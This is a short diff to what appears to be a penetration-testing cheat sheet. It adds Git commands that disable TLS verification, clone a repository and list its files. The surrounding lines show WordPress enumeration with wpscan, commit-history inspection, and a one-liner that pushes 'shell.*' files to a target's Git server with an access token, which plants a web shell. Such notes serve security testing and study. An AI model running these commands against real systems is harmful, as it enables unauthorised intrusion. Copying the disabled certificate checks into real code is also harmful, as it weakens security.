@@ -166,6 +166,9 @@ wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
 
 [*] Git
+export GIT_SSL_NO_VERIFY=true
+git clone https://SITE/USER/REPO.git ./git
+tree ./git -a -f
 git rev-list --all
 git cat-file -p acb753dd975a639f2dbc28ee8fd4d67adc50e609
 git add shell.*;git commit -m 'added';git push http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$TARGET:3000/$USERNAME/website.git
